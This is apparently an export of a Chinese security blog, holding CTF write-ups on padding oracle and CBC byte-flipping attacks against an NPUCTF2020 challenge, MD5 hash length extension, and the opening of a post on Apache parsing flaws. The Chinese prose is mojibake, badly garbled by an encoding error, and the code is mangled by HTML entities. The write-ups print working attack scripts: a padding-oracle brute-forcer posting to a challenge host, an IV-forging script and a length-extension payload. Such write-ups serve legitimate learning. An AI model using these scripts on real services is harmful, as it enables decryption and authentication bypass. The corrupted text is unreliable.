ç„¶åæˆ‘ä»¬æŠŠIVæœ€åä¸€ä½æ•°è®¾ç½®ä¸ºèƒ½å’Œä¸­é—´å€¼æœ€åä¸€ä½æ•°å¼‚æˆ–åå€¼ä¸º0x02çš„æ•°ï¼Œç©·ä¸¾IVå€’æ•°ç¬¬äºŒä¸ªæ•°çœ‹çœ‹å“ªä¸ªæ•°èƒ½å’Œä¸­é—´å€¼å€’æ•°ç¬¬äºŒä¸ªæ•°å¼‚æˆ–è¿ç®—åå€¼ä¸º0x02ï¼Œç„¶åæˆ‘ä»¬å°±å¯å¾—åˆ°ä¸­é—´å€¼å€’æ•°ç¬¬äºŒä¸ªæ•°ï¼Œä»¥æ­¤ç±»æ¨å¯ä»¥è·å¾—ç¬¬ä¸€ç»„çš„ä¸­é—´å€¼ï¼ˆæœ‰ç‚¹ç»•ï¼‰ç„¶åç ´è§£åˆ°äº†ä¸­é—´å€¼æˆ‘ä»¬å†ç”¨æœ€å¼€å§‹çš„IVï¼ˆä¸æ˜¯æˆ‘ä»¬åé¢æ„é€ çš„IVï¼‰å»å’Œä¸­é—´å€¼å¼‚æˆ–å°±å¾—åˆ°æ˜æ–‡äº†å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥å†æ¬¡æ„é€ IVï¼Œä»è€Œæ„é€ è§£å¯†å‡ºæ¥çš„å­—ç¬¦ï¼ˆé€šè¿‡ä¸­é—´å€¼ä¸IVå¼‚æˆ–ï¼‰ [NPUCTF2020]webğŸ•ä¸­çš„Padding oracle Attackæˆ‘ä»¬ä»¥è¿™é“é¢˜ä¸ºåˆ‡å…¥ç‚¹ï¼Œè¯¦ç»†çœ‹çœ‹å¦‚ä½•å®ç°æ”»å‡»ã€‚æœ¬é¢˜å°±æ˜¯ä»¥ä¸‹ä»£ç ï¼Œæˆ‘ä»¬è¦æƒ³æ–¹è®¾æ³•å…ˆæ‹¿åˆ°$flag &lt;?php error_reporting(0);include(&#39;config.php&#39;); # $key,$flagdefine(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); &#x2F;&#x2F;å®šä¹‰åŠ å¯†æ–¹å¼define(&quot;SECRET_KEY&quot;, $key); &#x2F;&#x2F;å®šä¹‰å¯†é’¥define(&quot;IV&quot;,&quot;6666666666666666&quot;); &#x2F;&#x2F;å®šä¹‰åˆå§‹å‘é‡ 16ä¸ª6define(&quot;BR&quot;,&#39;&lt;br&gt;&#39;);if(!isset($_GET[&#39;source&#39;]))header(&#39;location:.&#x2F;index.php?source&#x3D;1&#39;);#var_dump($GLOBALS); &#x2F;&#x2F;å¬è¯´ä½ æƒ³çœ‹è¿™ä¸ªï¼Ÿfunction aes_encrypt($iv,$data)&#123; echo &quot;--------encrypt---------&quot;.BR; echo &#39;IV:&#39;.$iv.BR; return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;&#125;function aes_decrypt($iv,$data)&#123; return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(&#39;False&#39;); &#x2F;&#x2F;åªèƒ½è¿”å›1æˆ–false&#125;if($_GET[&#39;method&#39;]&#x3D;&#x3D;&#39;encrypt&#39;)&#123; $iv &#x3D; IV; $data &#x3D; $flag; echo aes_encrypt($iv,$data);&#125; else if($_GET[&#39;method&#39;]&#x3D;&#x3D;&quot;decrypt&quot;)&#123; $iv &#x3D; @$_POST[&#39;iv&#39;]; $data &#x3D; @$_POST[&#39;data&#39;]; echo aes_decrypt($iv,$data);&#125;echo &quot;æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯&quot;.BR;if($_GET[&#39;source&#39;]&#x3D;&#x3D;1)highlight_file(__FILE__);?&gt; æˆ‘ä»¬å…ˆæ‹¿åˆ°å¯†æ–‡ ly7auKVQCZWum/W/4osuPA==ç„¶åå¯¹å…¶è¿›è¡Œbase64è§£å¯†ï¼Œå‘ç°å…¶åˆšå¥½æ˜¯æœ‰16ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ç©·ä¸¾IVå¾—åˆ°ä¸­é—´å€¼ï¼Œç„¶åå‡­æ­¤ä¸åˆå§‹IVï¼ˆ16ä¸ª6ï¼‰è¿›è¡Œå¼‚æˆ–å¾—åˆ°æ˜æ–‡$flag. è¯ä¸å¤šè¯´ï¼Œçˆ†ç ´ä¸­é—´å€¼çš„è„šæœ¬å®‰æ’ä¸Šã€‚(å€Ÿé‰´äº†ä¸€ä¸ªå¤§ä½¬çš„WPï¼‰ import requestsimport base64import timeIntermediary&#x3D;&quot;&quot;url&#x3D;&quot;http:&#x2F;&#x2F;de1650aa-2b24-40e0-bb51-736ff5d38269.node3.buuoj.cn&#x2F;&#x2F;index.php?source&#x3D;1&amp;method&#x3D;decrypt&quot;iv&#x3D;&quot;&quot;hexs&#x3D;&quot;&quot;IV&#x3D;&quot;6666666666666666&quot;def xor(a,b): return &quot;&quot;.join([chr(ord(a[i])^ord(b[i])) for i in range(len(a))])for step in range(1,17): padding&#x3D;chr(step)*(step-1) print(&quot;ç¬¬%sè½®&quot;%step) for i in range(0,256): iv&#x3D;chr(0)*(16-step)+chr(i)+xor(Intermediary,padding) post&#x3D;&#123; &quot;iv&quot;:iv, &quot;data&quot;:&quot;ly7auKVQCZWum&#x2F;W&#x2F;4osuPA&#x3D;&#x3D;&quot; &#125; r&#x3D;requests.post(url&#x3D;url,data&#x3D;post,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;) time.sleep(0.1) print(r.text+&quot;ç¬¬%sè½®i&#x3D;%s &quot;%(step,i)) if &quot;False&quot; !&#x3D; r.text: Intermediary&#x3D;xor(chr(i),chr(step))+Intermediary print(Intermediary) breakfor k in range(len(Intermediary)): hexs&#x3D;&quot;%&quot;+str(ord(Intermediary[k]))+hexsprint(hexs)print(xor(Intermediary,IV)) çˆ†å‡ºäº†ä¸­é—´å€¼å’Œ$flagæ˜æ–‡ è¿™é‡Œæœ‰äº›ç–‘æƒ‘ï¼Œä¸ºå•¥ä¸­é—´å€¼ä¼šæ˜¯15ä½çš„â€¦å‘ç°$flagä¸æ˜¯æœ€ç»ˆflagï¼Œè‡³äºæ¥ä¸‹æ¥è¦åšçš„ä¸œè¥¿ï¼Œå°±æ˜¯CBCå­—èŠ‚ç¿»è½¬æ”»å‡»äº† CBCç¿»è½¬å­—èŠ‚æ”»å‡»åœ¨å¯¹CBCæ¨¡å¼åŠ å¯†çš„æ•°æ®è¿›è¡Œè§£å¯†æ—¶ï¼Œè‹¥ivå¯æ§ï¼Œåˆ™å¯ä»¥ä»»æ„æ§åˆ¶è§£å¯†åçš„å†…å®¹ã€‚CBCç¿»è½¬å­—èŠ‚æ”»å‡»ä¸åŒäºpadding oracle attackï¼Œåè€…çš„æ ¸å¿ƒæ˜¯IVå¯æ§æƒ…å†µä¸‹è·å–ä¸­é—´å€¼ï¼Œä»è€Œå¯ä»¥è·å¾—æ˜æ–‡æˆ–è€…ä»»æ„æ§åˆ¶å¯†æ–‡è§£å¯†åçš„æ•°æ®ã€‚è€ŒCBCç¿»è½¬å­—èŠ‚æ”»å‡»çš„æ ¸å¿ƒæ€æƒ³å°±ä¸æ˜¯è·å–ä¸­é—´å€¼äº†ï¼Œè€Œæ˜¯åœ¨IVå¯æ§çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ç®—æ³•ç¼ºé™·æ¥ç›´æ¥æ§åˆ¶å¯†æ–‡è§£å¯†åçš„æ•°æ®ã€‚ ç°åœ¨å‡å®šæœ‰ä¸­é—´å€¼A,æ˜æ–‡B1,IV C1é‚£ä¹ˆå°±æœ‰ A^B1&#x3D;c1 ä¸€ç‚¹é”™è¯¯éƒ½æ²¡æœ‰å¯¹å§ã€‚ç°åœ¨åˆå‡å®šæœ‰ä¸­é—´å€¼A,æˆ‘ä»¬æƒ³è¦è§£å¯†å‡ºçš„æ˜æ–‡B2å’Œä¸ä¹‹å¯¹åº”çš„IV C2é‚£ä¹ˆå°±æœ‰ A^B2&#x3D;C2ç»“åˆä»¥ä¸Šä¸¤ä¸ªå¼å­ï¼Œæœ‰A&#x3D;B1^C1&#x3D;B2^C2äºæ˜¯æœ‰B2&#x3D;B1^C1^C2æˆ–C2&#x3D;B1^B2^C1è‹¥æˆ‘ä»¬å·²çŸ¥B1,C1,ä¸”C2å¯æ§,é‚£ä¹ˆB2å³å¯æ§æ—¢æ»¡è¶³åˆšåˆšæˆ‘ä»¬è¯´çš„ï¼Œé€šè¿‡ç®—æ³•ç¼ºé™·æ¥ç›´æ¥æ§åˆ¶å¯†æ–‡è§£å¯†åçš„æ•°æ®ã€‚ è¿™ï¼Œå°±æ˜¯CBCç¿»è½¬å­—èŠ‚æ”»å‡»ï¼Œæ²¡å¤ªæ‡‚æ²¡äº‹ï¼Œçœ‹ä¾‹å­å°±è¡Œäº† [NPUCTF2020]webğŸ•ä¸­çš„CBCç¿»è½¬å­—èŠ‚æ”»å‡»è·Ÿè¿›æˆ‘ä»¬åˆšåˆšè®²çš„ï¼ŒFlagIsHere.php,æ ¸å¿ƒä»£ç å¦‚ä¸‹ X5uucFgPTVdCo9f3ZHGP8g&#x3D;&#x3D;&lt;?php #error_reporting(0);include(&#39;config.php&#39;); &#x2F;&#x2F;$fl4gdefine(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);define(&quot;SECRET_KEY&quot;, &quot;6666666&quot;);session_start();function get_iv()&#123; &#x2F;&#x2F;ç”Ÿæˆéšæœºåˆå§‹å‘é‡IV $random_iv&#x3D;&#39;&#39;; for($i&#x3D;0;$i&lt;16;$i++)&#123; $random_iv.&#x3D;chr(rand(1,255)); &#125; return $random_iv;&#125;$lalala &#x3D; &#39;piapiapiapia&#39;;if(!isset($_SESSION[&#39;Identity&#39;]))&#123; $_SESSION[&#39;iv&#39;] &#x3D; get_iv(); $_SESSION[&#39;Identity&#39;] &#x3D; base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[&#39;iv&#39;]));&#125;echo base64_encode($_SESSION[&#39;iv&#39;]).&quot;&lt;br&gt;&quot;;if(isset($_POST[&#39;iv&#39;]))&#123; $tmp_id &#x3D; openssl_decrypt(base64_decode($_SESSION[&#39;Identity&#39;]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[&#39;iv&#39;])); echo $tmp_id.&quot;&lt;br&gt;&quot;; if($tmp_id &#x3D;&#x3D;&#x3D;&#39;weber&#39;)die($fl4g);&#125;highlight_file(__FILE__);?&gt; æ­¤æ—¶æˆ‘ä»¬å·²çŸ¥åˆå§‹IV,åˆå§‹å¯†æ–‡ï¼Œä¸”IVå¯æ§ï¼Œé‚£ä¹ˆCBCç¿»è½¬å­—èŠ‚æ”»å‡»æ¡ä»¶æˆç«‹ï¼Œå¯ä»¥æ”»å‡»ã€‚ è¿™é‡Œè´´ä¸€ä¸ªåˆ«äººå†™çš„python2 CBCå­—èŠ‚åè½¬æ”»å‡»è„šæœ¬è‡ªå·±æ‹¿python3å†™äº†åŠå¤©éƒ½æ²¡å†™å‡ºå¾ˆå¥½çš„æ•ˆæœ...import base64def bxor(b1, b2): # use xor for bytes parts &#x3D; [] for b1, b2 in zip(b1, b2): parts.append(bytes([b1 ^ b2])) return b&#39;&#39;.join(parts)iv &#x3D; base64.b64decode(&quot;h34HL5RbMPw8oTaQ+P58nw&#x3D;&#x3D;&quot;)text &#x3D; b&quot;piapiapiapia\\x04\\x04\\x04\\x04&quot;result &#x3D; b&quot;weber\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b&quot;middle &#x3D; bxor(iv,text)iv &#x3D; bxor(middle,result)print(base64.b64encode(iv)) æŠŠè·‘å‡ºæ¥çš„ç»“æœPOSTè¿‡å»ï¼Œå°±ä¼šå¾—åˆ°ä¸‹ä¸€æ­¥äº†.. Hashé•¿åº¦æ‰©å±•æ”»å‡»1 byte=8 bit hashç®—æ³•Merkleâ€“DamgÃ¥rdæ„é€ æ˜“å—hashé•¿åº¦æ‰©å±•æ”»å‡»çš„ç®—æ³•æœ‰ SHAç³»åˆ—ä¸MDç³»åˆ—ï¼Œå› ä¸ºä»–ä»¬éƒ½æ˜¯åŸºäºMerkleâ€“DamgÃ¥rdæ„é€ ã€‚å…·ä½“å®ƒæ˜¯æ€ä¹ˆç»“æ„ï¼Œä»ä¸‹æ–‡çš„MD5ç®—æ³•å¯ä»¥æ„Ÿå—åˆ° MD5ç®—æ³•åˆ†ç»„MD5ç®—æ³•é‡Œï¼Œä¼šå…ˆè®¾ç½®å¥½ä¸€ä¸ªä¸€ä¸ªçš„åˆ†ç»„ï¼Œæ¯ä¸ªç»„çš„å¤§å°æ˜¯512bitæˆ–è€…è¯´æ˜¯64bytesã€‚ æ¯ä¸ªç»„éƒ½åŒ…å«2ä¸ªéƒ¨åˆ†:1.æ•°æ®åŒºï¼Œå 56bytesæ¥è®°å½•éœ€è¦è¢«åŠ å¯†çš„å­—ç¬¦ä¸²æ•°æ®ï¼Œå½“æ•°æ®æ— æ³•å¡«æ»¡æ•°æ®åŒºæ—¶ï¼Œä¼šè¿›è¡Œâ€è¡¥ä½â€æ“ä½œ(è¯·çœ‹ä¸‹æ–‡è§£é‡Š)2.é•¿åº¦æè¿°ç¬¦åŒº,ç”¨äºè®°å½•â€œéè¡¥ä½â€æ•°æ®çš„å¤§å°,å 8ä¸ªbyteï¼Œå…¶å€¼ä¸ºè¯¥ç»„æ•°æ®åŒºç§éè¡¥ä½æ•°æ®çš„bitå¤§å°çš„16è¿›åˆ¶å€¼ã€‚æ¯”å¦‚éè¡¥ä½æ•°æ®æ˜¯admin,å…¶å 5ä¸ªbyteï¼Œ40ä¸ªbitï¼Œ40çš„åå…­è¿›åˆ¶æ˜¯28ï¼Œæ‰€ä»¥å…¶å€¼ä¼šæ˜¯28ã€‚ç„¶åè¿™ä¸ªå€¼ä¼šä»¥ä¸€ç§å«åšå°ç«¯å­˜å‚¨çš„æ–¹å¼è®°å½•åˆ°é•¿åº¦æè¿°ç¬¦åŒºã€‚ï¼ˆéè¡¥ä½æ•°æ®æŒ‡è¯¥ç»„çš„éå¡«å……çš„æ•°æ®ï¼Œå³çœŸæ­£éœ€è¦è¢«åŠ å¯†çš„å­—ç¬¦ä¸²ï¼‰ è¡¥ä½å¾ˆç®€å•ï¼Œè‹¥æŸä¸ªç»„çš„æ•°æ®é•¿åº¦å°äº56byteï¼Œè¯¥ç»„çš„æ•°æ®åŒºä¸ä¼šè¢«å æ»¡ï¼Œé‚£ä¹ˆå°±ä¼šè‡ªåŠ¨è¡¥ä½æ¥ä½¿æ•°æ®åŒºè¢«å¡«æ»¡ã€‚ å…¶è§„åˆ™æ˜¯åœ¨æ•°æ®åå…ˆæ·»åŠ ä¸€ä¸ª80å­—èŠ‚ï¼Œç„¶åå†ç”¨00å­—èŠ‚å¡«å……å®Œæ•´ä¸ªæ•°æ®åŒºã€‚ åˆ†ç»„ä¸è¡¥ä½å°ç»“å†æ›´è¿›ä¸€æ­¥çš„äº†è§£MD5ç®—æ³•å‰ï¼Œéœ€è¦æ›´åŠ æ·±åˆ»åœ°ç†è§£ä¸€ä¸‹åˆ†ç»„ä¸è¡¥ä½ï¼Œä¸ç„¶ç¨åçš„ç†è§£ä¼šéå¸¸å›°éš¾ã€‚ åŠ å¯†æµç¨‹è¿™é‡Œæ”¾å¼ è‡ªå·±ç”»çš„åŠ å¯†æµç¨‹çš„å›¾ å­—ç¬¦ä¸²å…ˆåˆ†ç»„ï¼Œç„¶åç¬¬ä¸€ç»„ä¸åˆå§‹é“¾è¿›è¡Œå¤æ‚æ•°å­¦è¿ç®—å¾—åˆ°é“¾1.æ³¨æ„ï¼Œè¿™é‡Œçš„åˆå§‹é“¾æ˜¯å›ºå®šçš„ï¼Œæ¯ä¸ªMD5è¿ç®—çš„åˆå§‹é“¾éƒ½æ˜¯å›ºå®šçš„ï¼Œå…¶å€¼å°±æ˜¯å›¾ä¸­æ‰€è®°å½•çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ— è®ºå¯¹ä»€ä¹ˆæ•°æ®è¿›è¡ŒMD5åŠ å¯†ï¼Œå…¶åˆå§‹é“¾éƒ½æ˜¯ 0x674523010xefcdab890x98badcfe0x10325476 okã€‚ç¬¬ä¸€ç»„æ•°æ®ä¸åˆå§‹é“¾è¿›è¡Œå¤æ‚è¿ç®—å¾—åˆ°é“¾1ï¼Œç„¶åé“¾1ä¸ç¬¬äºŒç»„æ•°æ®è¿›è¡Œå¤æ‚è¿ç®—å¾—åˆ°é“¾2ï¼Œå¦‚æ­¤å¾€å¤ï¼Œç›´åˆ°å€’æ•°ç¬¬äºŒæ¡é“¾ä¸æœ€åä¸€ç»„æ•°æ®è¿›è¡Œå¤æ‚è¿ç®—å¾—åˆ°æœ€åä¸€æ¡é“¾(é“¾final) ç„¶åé“¾finalè¿›è¡Œé«˜ä½ä½è½¬æ¢å°±å¾—åˆ°æœ€ç»ˆhashï¼Œé‚£ä¹ˆä»€ä¹ˆæ˜¯é«˜ä½ä½è½¬æ¢ï¼Ÿ å¦‚æœfinalé“¾æ˜¯ A=0x20f4847a B=0x42e6abf8 C=0xf9097423 D=0x51a8dad4 é‚£ä¹ˆå…¶hashä¾¿æ˜¯ 7a84f420f8abe642237409f9d4daa851 hashé•¿åº¦æ‰©å±•æ”»å‡»åŸºç¡€çŸ¥è¯†æŒæ¡äº†ï¼Œå°±å¼€å§‹äº†è§£è¿™ä¸ªé‡å¤´æˆäº†ã€‚ ä»¥ä¸€é“é¢˜ä¸ºåˆ‡å…¥ç‚¹ï¼ˆæ”¹äº†ä¸€ä¸‹å®éªŒå§çš„ä¸€é“é¢˜ï¼‰ Your cookies don&#39;t match up! STOP HACKING THIS SITE. &lt;?phpinclude &quot;flag.php&quot;;&#x2F;&#x2F;$secret&#x3D;&quot;XXXXXXXXXXXXXXX&quot;; This secret is 15 characters long for security!$username&#x3D;&quot;admin&quot;;$password &#x3D; $_POST[&quot;password&quot;];if($_POST[&quot;getmein&quot;] &#x3D;&#x3D;&#x3D; md5($secret . urldecode($username . $password)))&#123; if(is_numeric(strpos($password,&quot;abc&quot;)))&#123; echo &quot;Congratulations! You are a registered user.\\n&quot;; die (&quot;The flag is &quot;. $flag); &#125;&#125;else&#123; echo(&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);&#125;highlight_file(__FILE__);echo(md5($secret . urldecode($username . &quot;admin&quot;)));?&gt; 93a5e7bea9c040065617b1a62ffc3d72 ä»ä¸­æˆ‘ä»¬å¯ä»¥å¾—çŸ¥secreté•¿åº¦æ˜¯15ï¼Œmd5($sercet.â€adminadminâ€)=93a5e7bea9c040065617b1a62ffc3d72é¢˜ç›®çš„æ„æ€å¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬éœ€è¦ä¼ ä¸¤ä¸ªå‚æ•°getmeinå’Œpasswordä½¿å¾—getmein=md5($secret.â€adminâ€.password),ä¸”passwordåŒ…å«abcå­—ç¬¦ é‚£ä¹ˆè¿™å°±æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»ç»å…¸çš„ä½¿ç”¨å…¸ä¾‹ï¼Œå³:çŸ¥é“salté•¿åº¦ï¼ˆè¿™é‡Œsecretå˜é‡çš„é•¿åº¦ï¼‰çŸ¥é“ä¸€ç»„è¢«åŠ å¯†å­—ç¬¦ä¸²é•¿åº¦å°äº56çš„æ ·æœ¬ï¼ˆ md5($sercet.â€adminadminâ€) çš„å€¼ï¼‰å³å¯çŸ¥é“æŸä¸ªå€¼ä¸saltä¸€èµ·è¢«MD5åŠ å¯†åçš„hash é‚£è¿™ç§æ”»å‡»æ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿé¦–å…ˆæˆ‘ä»¬çŸ¥é“äº†ä¸€ç»„æ ·æœ¬ï¼Œå³ç­‰äºæˆ‘ä»¬çŸ¥é“äº†è¯¥æ ·æœ¬çš„finalé“¾ï¼ˆé«˜ä½ä½å˜æ¢ï¼‰ã€‚åŒæ—¶æˆ‘ä»¬çŸ¥é“äº†salté•¿åº¦ï¼Œå³ç­‰äºæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºè¯¥åˆ†ç»„ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬åˆæ„é€ å‡ºä¸€ä¸ªæ–°çš„åˆ†ç»„ï¼ŒåŒæ—¶å…¶ä¸Šä¸€ä¸ªç»„æ˜¯å·²çŸ¥æ ·æœ¬ï¼Œé‚£ä¹ˆä¸æ–°åˆ†ç»„è¿›è¡Œå¤æ‚è¿ç®—çš„å°±æ˜¯å·²çŸ¥æ ·æœ¬çš„finalé“¾ã€‚å·²çŸ¥æ ·æœ¬çš„finalé“¾ï¼Œæ–°åˆ†ç»„çš„å¾…åŠ å¯†å­—ç¬¦ä¸²ï¼Œå³å¯é€šè¿‡å¤æ‚è¿ç®—ï¼Œé«˜ä½ä½å˜æ¢è·å¾—æœ€ç»ˆhashã€‚æ•…æ–°åˆ†ç»„å¾…åŠ å¯†å­—ç¬¦ä¸²çš„hashå€¼æ˜¯å¯ä»¥é¢„æµ‹çš„ã€‚è¿™ï¼Œå°±æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»çš„åŸç†ã€‚å¯èƒ½è¿˜æ˜¯äº‘é‡Œé›¾é‡Œçš„ï¼Œé‚£å°±çœ‹å¦‚ä½•è§£é¢˜å§ã€‚ å› ä¸ºå·²çŸ¥salté•¿åº¦ï¼Œé‚£ä¹ˆå¯ä»¥é¢„æµ‹ä¸€ä¸‹æ ·æœ¬çš„åˆ†ç»„çš„æƒ…å†µå› ä¸ºsalt+adminadminçš„é•¿åº¦æ˜¯25ï¼Œé‚£ä¹ˆå…¶bitå°±æ˜¯200ï¼Œè½¬æ¢ä¸º16è¿›åˆ¶å°±æ˜¯c8.é‚£ä¹ˆå‡è®¾saltå­—ç¬¦å…¨ä¸ºxï¼ˆä»…ä»…æ˜¯ä¸ªå‡è®¾è€Œå·²ï¼Œåˆ«æƒ³å¤ªå¤šäº†ï¼‰ï¼Œè¯¥åˆ†ç»„çš„æƒ…å†µ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¼ å‚password=admin%80%00*30abcå…¶ä¸­abcä»¥å‰çš„å­—ç¬¦ä¼šåœ¨è¢«MD5è¿ç®—çš„æ—¶å€™åˆ†é…åˆ°å‰ä¸€ä¸ªç»„ï¼Œç„¶åé€šè¿‡è¿ç®—è·å¾—é“¾1ï¼Œè¿™ä¸ªé“¾1å°±æ˜¯æˆ‘ä»¬å·²çŸ¥æ ·æœ¬çš„finalé“¾äº†ã€‚ç„¶åæˆ‘ä»¬å°±å¯ä»¥é¢„çŸ¥ï¼Œè¿™ä¸ªfinalé“¾ä¸abcè¿›è¡Œå¤æ‚è¿ç®—ï¼Œé«˜ä½ä½å˜æ¢å¾—åˆ°çš„hashäº†ã€‚ç„¶åå†æŠŠè¿™ä¸ªhashèµ‹å€¼ç»™openmeinï¼Œè¿™ä¸ªé¢˜å°±åšå‡ºæ¥äº†ã€‚ å¥½çš„ï¼Œå¤§è‡´åŸç†å°±æ˜¯è¿™æ ·äº†ã€‚è¿™æ—¶å€™å¯ä»¥è‡ªè¡Œå†™è„šæœ¬æ¥æ‰¾åˆ°æŸæ˜æ–‡å¯¹åº”çš„MD5å¯†æ–‡ï¼Œæˆ–è€…ä½¿ç”¨å·¥å…·:hashpump. ![ ](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217152515.png)","categories":[],"tags":[{"name":"æ‚ä¸ƒæ‚å…«çš„å®‰å…¨é—®é¢˜","slug":"æ‚ä¸ƒæ‚å…«çš„å®‰å…¨é—®é¢˜","permalink":"http://const27.com/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"}]},{"title":"å¸¸è§ä¸­é—´ä»¶çš„æ”»å‡»æ–¹å¼","slug":"å¸¸è§ä¸­é—´ä»¶çš„æ”»å‡»æ–¹å¼","date":"2021-06-28T13:52:18.718Z","updated":"2021-06-28T13:46:47.143Z","comments":true,"path":"2021/06/28/å¸¸è§ä¸­é—´ä»¶çš„æ”»å‡»æ–¹å¼/","link":"","permalink":"http://const27.com/2021/06/28/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","excerpt":"","text":"apacheapacheæ–‡ä»¶å¤šåç¼€åè§£ææ¼æ´ä¸å…¶è¯´è¿™æ˜¯ä¸€ä¸ªæ¼æ´ï¼Œä¸å¦‚è¯´è¿™æ˜¯ä¸€ä¸ªç‰¹æ€§ï¼Œå¾ˆå¤šç¨‹åºå‘˜ä¸çŸ¥é“è¿™ç§ç‰¹æ€§ï¼Œæ‰€ä»¥ä¼šå†™å‡ºæœ‰é—®é¢˜çš„ä»£ç ã€‚ç‰¹æ€§ï¼šå¤šåç¼€å(å…¨ç‰ˆæœ¬éƒ½æœ‰è¿™ä¸ªç‰¹æ€§ï¼‰apacheåœ¨è§£æä¸€ä¸ªæ–‡ä»¶çš„åç¼€åæ—¶ï¼Œæ˜¯ä»å³å¾€å·¦è§£æåç¼€åçš„ï¼Œå¦‚æœå³è¾¹çš„åç¼€åä¸è®¤è¯†ï¼Œå°±ä¼šç»§ç»­å‘å·¦è¯†åˆ«ï¼Œç›´åˆ°è¯†åˆ«åˆ°ä¸€ä¸ªè®¤è¯†çš„åç¼€åï¼Œä½†æ˜¯ä¸‡ä¸€éƒ½ä¸è®¤è¯†å‘¢?éƒ½ä¸è®¤è¯†çš„è¯é»˜è®¤æƒ…å†µä¸‹æ˜¯plain/textå¤„ç†ã€‚é‚£ä¹ˆapacheæ˜¯æ€ä¹ˆçŸ¥é“å“ªä¸ªåç¼€åå®ƒæ˜¯è®¤è¯†çš„å‘¢?ç­”æ¡ˆæ˜¯è®¤è¯†çš„åç¼€åä»¬éƒ½è¢«è®°å½•åˆ°ä¸€ä¸ªå«mime.typesçš„æ–‡ä»¶ä¸­äº†ã€‚è¿™ä¸ªæ–‡ä»¶å‘¢,Windowsæ”¾åœ¨confæ–‡ä»¶å¤¹é‡Œï¼Œlinuxæ”¾åœ¨/etc/mime.typesï¼ˆä¸ä¸€å®šåœ¨è¿™é‡Œï¼Œéœ€è¦è‡ªå·±æ‰¾æ‰¾ï¼‰,æ‰“å¼€åæ˜¯è¿™æ · å®šä¹‰äº†ä¸åŒçš„åç¼€ååº”è¯¥å‘æµè§ˆå™¨è¿”å›ä»€ä¹ˆæ ·çš„mimeæ ¼å¼ã€‚è¿™é‡Œè¦è¯´çš„æ˜¯æœ‰äº›æƒ…å†µä¸‹çš„mime.typesæ²¡æœ‰æä¾›å¯¹phpçš„è§£ææ–¹æ³•ï¼Œå¯¹phpçš„è§£æè§„åˆ™æ”¾åœ¨å¦ä¸€ä¸ªæ–‡ä»¶ï¼ŒWindowsä¸‹åœ¨/conf/extra/httpd-php.confã€‚Linuxä¹Ÿæœ‰è¿™ä¸ªæ–‡ä»¶åœ¨/etc/apache2/mods-enabled/php7.2.confï¼ˆæˆ–è€…å’ŒWindowsçš„è·¯å¾„ä¸€æ ·),æ‰“å¼€åæ˜¯è¿™æ ·çš„ï¼Œå®šä¹‰äº†æ–‡ä»¶åæ»¡è¶³ä»€ä¹ˆæ¡ä»¶(æ­£åˆ™è¡¨è¾¾å¼)æ‰ä¼šå°†ä»–ç»™phpå¤„ç†å™¨å¤„ç†,è€Œä¸”ï¼Œå¦‚æœä½ mime.typesé‡ŒåŒ¹é…åˆ°äº†phpåç¼€ï¼Œä½†è¿™ä¸ªå¤„ç†å™¨åŒ¹é…æ–‡ä»¶æ²¡æœ‰åŒ¹é…æˆåŠŸï¼Œä»–è¿˜æ˜¯ä¸ä¼šæŠŠphpæ–‡ä»¶è¿›è¡Œå¤„ç† å¯ä»¥è¯•ä¸€è¯•ï¼Œç¡®å®æ˜¯è¿™æ ·çš„,apacheå¯¹è¿™ä¸ªæ–‡ä»¶ç¬¬ä¸€ä¸ªåŒ¹é…åˆ°çš„åç¼€åæ˜¯jpgï¼Œæ‰€ä»¥æŠŠå®ƒå½“ä½œå›¾ç‰‡å¤„ç†äº†ï¼Œè¿”å›äº†å›¾ç‰‡ç±»å‹çš„mimeå¤´ï¼Œæµè§ˆå™¨ä¹Ÿå°±æŠŠè¿™ä¸ªæ–‡ä»¶å½“ä½œå›¾ç‰‡å¤„ç†ï¼Œäºæ˜¯å‡ºç°äº†è¿™ç§æƒ…å†µ å½“ç„¶ï¼Œç”¨è¿™ç§å¤šåŸŸåç‰¹æ€§å»è§£æphpæ–‡ä»¶çš„è¯ï¼Œå°±éœ€è¦åœ¨ä¸Šæ–‡æåˆ°çš„æ–‡ä»¶é‡Œå»ä¿®æ”¹ä¿®æ”¹å“¦ã€‚ apache æ¢è¡Œç»•è¿‡2.4.0~2.4.29ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æPHPæ—¶ï¼Œ1.php\\x0Aå°†è¢«æŒ‰ç…§PHPåç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ã€‚ apache 